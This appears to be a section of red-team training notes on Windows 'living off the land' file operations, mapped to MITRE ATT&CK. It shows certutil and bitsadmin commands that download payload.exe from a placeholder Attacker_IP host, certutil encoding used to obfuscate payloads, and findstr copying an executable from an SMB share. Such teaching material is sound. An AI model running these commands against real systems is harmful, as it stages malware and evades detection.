# Living Off the Land: File Operations

This section covers commonly used Windows tools for file operations, often leveraged in real-world malware activities and red team engagements. These "Living Off the Land" (LOtL) techniques include downloading, uploading, and encoding files using built-in utilities.

---

## Certutil

**Certutil** is a Windows built-in utility for handling certification services. While its primary use is to retrieve certificate information, it can also be abused to transfer and encode files unrelated to certification services.

- **MITRE ATT&CK:** [Ingress Tool Transfer (T1105)](https://attack.mitre.org/techniques/T1105/)

### Downloading a File

You can use `certutil.exe` to download a file from an attacker's web server and store it in the Windows temporary folder:

```cmd
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
```

- `-URLcache`: Enables the URL option.
- `-split -f`: Splits and forces fetching files from the provided URL.

### Encoding a File

`certutil.exe` can also encode files to obfuscate them, making detection and analysis more difficult.

- **MITRE ATT&CK:** [Obfuscated Files or Information (T1027)](https://attack.mitre.org/techniques/T1027/)

```cmd
certutil -encode payload.exe Encoded-payload.txt
```

For more information, see [Microsoft Docs: CertUtil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil).

---

## BITSAdmin

**BITSAdmin** is a system administrator utility for creating, downloading, or uploading Background Intelligent Transfer Service (BITS) jobs.

- **MITRE ATT&CK:** [BITS Jobs (T1197)](https://attack.mitre.org/techniques/T1197/)

Attackers may abuse BITS jobs to download and execute malicious payloads.

```cmd
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
```

- `/transfer`: Initiates a transfer job.
- `/Download`: Specifies download type.
- `/priority Foreground`: Sets the job priority.

For more details, see [Microsoft Docs: BITSAdmin](https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

---

## FindStr

**Findstr** is a built-in tool for searching text and string patterns in files or command output. It can also be abused to download remote files from SMB shared folders:

```cmd
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
```

- `/V`: Prints lines that do **not** contain the specified string.
- `dummystring`: A string that is not expected to be found.
- `>`: Redirects output to a file.

---

## Additional Resources

Other tools can be used for file operations. For a comprehensive list, visit the [LOLBAS project](https://lolbas-project.github.io/).

---

In the next section, we will introduce tools used to execute files.